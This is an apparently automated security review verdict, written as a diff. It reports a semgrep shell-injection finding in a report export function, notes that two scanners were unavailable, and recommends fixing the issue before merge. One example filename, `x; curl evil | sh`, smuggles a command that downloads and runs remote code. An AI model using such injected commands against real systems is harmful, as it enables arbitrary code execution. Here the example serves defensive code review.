@@ -1,0 +1,39 @@
+Verdict: fix-before-merge
+Reason: semgrep reports shell injection in export_report; scanner hit confirmed by reading the code.
+Scanner: security-scan.sh exit 1 — gitleaks=unavailable, semgrep=findings, dependency-audit=unavailable
+
+Scanner output (SECURITY_SCAN_OFFLINE=1 bash security-scan.sh --base origin/main --json, exit 1):
+
+```
+{"scanners":[{"name":"gitleaks","status":"unavailable","findings":[],"reason":"gitleaks not installed"},{"name":"semgrep","status":"findings","findings":[{"file":"src/report.py","line":5,"rule":"aos.python.subprocess-shell-true","severity":"ERROR","message":"subprocess with shell=True and a non-literal command allows shell injection."}]},{"name":"dependency-audit","status":"unavailable","findings":[],"reason":"no supported lockfile found"}],"skipped":[]}
+```
+
+Critical / High
+- src/report.py:5 — `subprocess.run("tar czf /tmp/out.tgz " + filename, shell=True, check=True)`
+  Exploit: a filename of `x; curl evil | sh` runs arbitrary commands.
+  Fix: pass an argv list without shell=True.
+
+Low / Hardening
+- . — scanner unavailable: gitleaks (gitleaks not installed)
+- . — scanner unavailable: dependency-audit (no supported lockfile found)
+
+```json
+{
+  "schema": "agentic-os/review-verdict@1",
+  "agent": "security-reviewer",
+  "base": "origin/main",
+  "head": "0123456789abcdef0123456789abcdef01234567",
+  "verdict": "fix-before-merge",
+  "findings": [
+    {"tier": 0, "severity": "high", "file": "src/report.py", "line": 5,
+     "summary": "subprocess.run with shell=True on a concatenated filename allows shell injection",
+     "evidence": "SECURITY_SCAN_OFFLINE=1 bash security-scan.sh --base origin/main --json -> exit 1; semgrep finding {\"file\":\"src/report.py\",\"line\":5,\"rule\":\"aos.python.subprocess-shell-true\",\"severity\":\"ERROR\",\"message\":\"subprocess with shell=True and a non-literal command allows shell injection.\"}"},
+    {"tier": 2, "severity": "low", "file": ".", "line": null,
+     "summary": "scanner unavailable: gitleaks",
+     "evidence": "security-scan.sh exit 1; gitleaks status unavailable: gitleaks not installed"},
+    {"tier": 2, "severity": "low", "file": ".", "line": null,
+     "summary": "scanner unavailable: dependency-audit",
+     "evidence": "security-scan.sh exit 1; dependency-audit status unavailable: no supported lockfile found"}
+  ]
+}
+```
